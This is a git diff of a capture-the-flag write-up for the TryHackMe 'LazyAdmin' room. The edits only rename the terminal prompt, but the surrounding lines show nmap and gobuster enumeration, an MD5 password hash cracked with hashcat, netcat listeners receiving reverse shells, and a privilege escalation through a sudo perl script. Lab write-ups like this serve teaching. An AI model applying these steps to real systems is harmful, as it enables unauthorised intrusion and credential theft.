@@ -12,7 +12,7 @@ Have some fun! There might be multiple ways to get user access.
 We add the host in /etc/hosts (lazy.thm) and scan with [Nmap](../../3%20-%20Tags/Hacking%20Tools/Nmap.md):
 
 ```
-┌──(hax㉿HaxonKali)-[~/THM/CHALLENGES/Easy/LazyAdmin]
+┌──(mdn0x㉿mdn0xKali)-[~/THM/CHALLENGES/Easy/LazyAdmin]
 └─$ nmap  -A  10.10.205.167   
 
 PORT   STATE SERVICE VERSION
@@ -33,7 +33,7 @@ OS details: Linux 4.15
 We start [Enumeration](../../3%20-%20Tags/Hacking%20Concepts/Enumeration.md) on port 80 with [Gobuster](../../3%20-%20Tags/Hacking%20Tools/Gobuster.md) :
 
 ```
-┌──(hax㉿HaxonKali)-[~/THM/CHALLENGES/Easy/LazyAdmin]
+┌──(mdn0x㉿mdn0xKali)-[~/THM/CHALLENGES/Easy/LazyAdmin]
 └─$ gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -u http://lazy.thm
 
 
@@ -49,7 +49,7 @@ We start [Enumeration](../../3%20-%20Tags/Hacking%20Concepts/Enumeration.md) on 
 Enumerating /content :
 
 ```
-┌──(hax㉿HaxonKali)-[~/THM/CHALLENGES/Easy/LazyAdmin]
+┌──(mdn0x㉿mdn0xKali)-[~/THM/CHALLENGES/Easy/LazyAdmin]
 └─$ gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -u http://lazy.thm/content
 ===============================================================
 Gobuster v3.6
@@ -100,11 +100,11 @@ manager : **42f749ade7f9e195bf475f37a44cafcb**
 You might recognise that hash format as being [MD5](../../3%20-%20Tags/Hacking%20Concepts/MD5.md). We use [Hashcat](../../3%20-%20Tags/Hacking%20Tools/Hashcat.md) with the rockyou wordlist and crack it :
 
 ```
-┌──(hax㉿HaxonKali)-[~/THM/CHALLENGES/Easy/LazyAdmin]
+┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/LazyAdmin]
 └─$ hashcat -m0 -a0 --force -o cracked.txt  '42f749ade7f9e195bf475f37a44cafcb' /usr/share/wordlists/rockyou.txt
 
 
-┌──(hax㉿HaxonKali)-[~/THM/CHALLENGES/Easy/LazyAdmin]
+┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/LazyAdmin]
 └─$ cat cracked.txt 
 42f749ade7f9e195bf475f37a44cafcb:Password123
 
@@ -171,7 +171,7 @@ This gives the reverse shell something to connect back to.
 And once we click it we have it :
 
 ```
-┌──(hax㉿HaxonKali)-[~/THM/CHALLENGES/Easy/LazyAdmin]
+┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/LazyAdmin]
 └─$ nc -lvnp 1234 
 listening on [any] 1234 ...
 connect to [10.8.162.183] from (UNKNOWN) [10.10.205.167] 42568
@@ -232,7 +232,7 @@ $ sudo /usr/bin/perl /home/itguy/backup.pl
 And we **[Netcat](../../3%20-%20Tags/Hacking%20Tools/Netcat.md)** to have a root [Shell](../../3%20-%20Tags/Hacking%20Concepts/Shell.md) , we can cat the root flag :
 
 ```
-┌──(hax㉿HaxonKali)-[~/THM/CHALLENGES/Easy/LazyAdmin]
+┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/LazyAdmin]
 └─$ nc -lvnp 5554
 listening on [any] 5554 ...
 connect to [10.8.162.183] from (UNKNOWN) [10.10.205.167] 33370
